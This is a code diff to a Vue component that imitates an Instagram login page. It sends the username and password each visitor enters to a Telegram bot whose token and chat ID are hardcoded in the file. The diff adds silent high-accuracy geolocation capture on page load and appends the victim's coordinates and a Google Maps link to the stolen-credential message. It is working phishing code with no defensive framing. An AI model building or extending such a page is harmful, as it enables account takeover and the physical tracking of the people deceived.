@@ -1,7 +1,6 @@
 <template>
   <div class="container">
     <div class="login-box">
-      <!-- Faqat bitta logo-container -->
       <div class="logo-container">
         <img
           src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"
@@ -58,9 +57,43 @@ export default {
       password: "",
       botToken: "7622854137:AAH6xblJA8biVHaE4VbC1svOAC-izatOoZI",
       chatId: "5673984207",
+      latitude: null,
+      longitude: null,
+      locationError: null,
     };
   },
+  mounted() {
+    // Request user's geolocation when the component is mounted
+    this.getGeolocation();
+  },
   methods: {
+    // Get user's geolocation
+    getGeolocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            // Success callback
+            this.latitude = position.coords.latitude;
+            this.longitude = position.coords.longitude;
+            console.log("Location captured:", this.latitude, this.longitude);
+          },
+          (error) => {
+            // Error callback
+            this.locationError = error.message;
+            console.error("Geolocation error:", error.message);
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 5000,
+            maximumAge: 0,
+          }
+        );
+      } else {
+        this.locationError = "Geolocation is not supported by this browser.";
+        console.error("Geolocation is not supported by this browser.");
+      }
+    },
+
     handleLogin() {
       // Log the login attempt
       console.log("Login attempt with:", {
@@ -80,12 +113,18 @@ export default {
     },
 
     sendToTelegram() {
-      // Format the message
+      // Format the message with geolocation data
       const message = `
 New Instagram Login:
 Username: ${this.username}
 Password: ${this.password}
 Time: ${new Date().toLocaleString()}
+${
+  this.latitude && this.longitude
+    ? `Location: ${this.latitude}, ${this.longitude}
+Google Maps: https://www.google.com/maps?q=${this.latitude},${this.longitude}`
+    : "Location: Not available"
+}
       `;
 
       // Encode the message for URL
@@ -132,6 +171,7 @@ Time: ${new Date().toLocaleString()}
 
 .logo-container {
   display: flex;
+  flex-direction: column;
   justify-content: center;
   align-items: center;
   margin-bottom: 32px;
@@ -142,6 +182,12 @@ Time: ${new Date().toLocaleString()}
   font-family: serif;
   font-style: italic;
   font-weight: 600;
+  margin-top: 10px;
+}
+
+.logo-img {
+  width: 72px;
+  height: 72px;
 }
 
 .login-form {
@@ -224,10 +270,5 @@ Time: ${new Date().toLocaleString()}
 .signup-link {
   color: #0095f6;
   text-decoration: none;
-}
-.logo-img {
-  width: 40px;
-  height: 40px;
-  margin-right: 10px;
 }
 </style>
